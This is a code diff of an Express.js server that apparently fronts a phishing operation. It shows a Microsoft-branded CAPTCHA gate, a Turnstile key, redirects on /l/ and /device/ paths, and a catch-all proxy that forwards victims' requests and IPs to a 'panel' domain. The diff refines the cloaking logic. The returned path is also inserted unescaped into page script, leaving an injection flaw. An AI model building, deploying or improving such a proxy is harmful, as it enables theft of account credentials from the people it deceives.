@@ -3,20 +3,30 @@ const cookieParser = require('cookie-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// ⚠️ CHANGE THESE TO YOUR VALUES
+// ⚠️ YOUR PANEL DOMAIN
 const PANEL_DOMAIN = 'portal42-343.sbs';
+
+// ⚠️ YOUR TURNSTILE SITE KEY (use the one that works)
 const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// CAPTCHA page
+// ---------- CAPTCHA PAGE ----------
 app.get('/captcha', (req, res) => {
-    const returnUrl = req.query.return || '/';
-    // Ensure the return URL is valid
-    const cleanReturn = returnUrl.startsWith('/') ? returnUrl : '/' + returnUrl;
+    // Get the return path from query, default to '/'
+    let returnPath = req.query.return || '/';
     
+    // Clean the path: remove double slashes at the start
+    if (returnPath.startsWith('//')) {
+        returnPath = returnPath.replace(/^\/+/, '/');
+    }
+    // Ensure it starts with a single slash
+    if (!returnPath.startsWith('/')) {
+        returnPath = '/' + returnPath;
+    }
+
     res.send(`
 <!DOCTYPE html>
 <html lang="en">
@@ -106,7 +116,7 @@ app.get('/captcha', (req, res) => {
     <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
   </div>
   <script>
-    const returnUrl = "${cleanReturn}";
+    const returnPath = "${returnPath}";
     const messages = ["Loading...", "Processing request...", "Almost there...", "Finalizing..."];
     let index = 0;
     function cycleMessages() {
@@ -118,8 +128,8 @@ app.get('/captcha', (req, res) => {
 
     function turnstileCallback(token) {
       if (token) {
-        // Immediately redirect to the actual content
-        window.location.href = returnUrl;
+        // Redirect to the cleaned return path
+        window.location.href = returnPath;
       }
     }
 
@@ -148,19 +158,21 @@ app.get('/captcha', (req, res) => {
     `);
 });
 
-// Middleware: redirect to CAPTCHA with the original URL
-app.use('/l/*', (req, res, next) => {
-    // Store the original URL and redirect to CAPTCHA
+// ---------- MIDDLEWARE: redirect to CAPTCHA ----------
+app.use('/l/*', (req, res) => {
     const originalUrl = req.originalUrl;
-    res.redirect(`/captcha?return=${encodeURIComponent(originalUrl)}`);
+    // Ensure the path doesn't have double slashes
+    const cleanPath = originalUrl.replace(/^\/+/, '/');
+    res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
 });
 
-app.use('/device/*', (req, res, next) => {
+app.use('/device/*', (req, res) => {
     const originalUrl = req.originalUrl;
-    res.redirect(`/captcha?return=${encodeURIComponent(originalUrl)}`);
+    const cleanPath = originalUrl.replace(/^\/+/, '/');
+    res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
 });
 
-// The main proxy
+// ---------- MAIN PROXY ----------
 app.use('*', async (req, res) => {
     try {
         const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
@@ -169,7 +181,7 @@ app.use('*', async (req, res) => {
         headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
         headers.delete('host');
 
-        // Forward real client IP
+        // Forward real client IP to help with Cloudflare
         const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         if (clientIp) {
             headers.set('X-Forwarded-For', clientIp);
